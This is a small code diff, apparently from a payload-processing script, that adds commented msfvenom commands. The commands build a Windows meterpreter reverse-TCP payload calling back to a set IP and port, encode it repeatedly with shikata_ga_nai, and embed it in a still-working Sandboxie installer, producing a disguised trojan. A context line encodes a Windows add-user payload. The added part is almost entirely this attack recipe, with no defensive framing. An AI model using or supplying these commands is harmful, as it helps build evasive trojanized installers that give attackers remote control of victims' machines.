@@ -35,6 +35,12 @@ for filename in os.listdir(payloads_dir):
 print('bye')
 
 
+# command is taken from here:
+# https://security.stackexchange.com/questions/154245/encode-an-executable-file-multiple-time-using-msf-venom
+
+# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.43.163 LPORT=12345 -e x86/shikata_ga_nai -i 10 -f raw > eoncode.bin
+
+#msfvenom -p - -x /root/Downloads/SandboxieInstall.exe -k -f exe -a x86 --platform windows -e x86/bloxor -i 2 > sanbox.exe < eoncode.bin
 
 
 # msfvenom --payload - --platform windows --arch x86 -e x86/shikata_ga_nai -f raw -o /home/kali/Desktop/windows_adduser.bin.encoded < /home/kali/Desktop/windows_adduser.bin
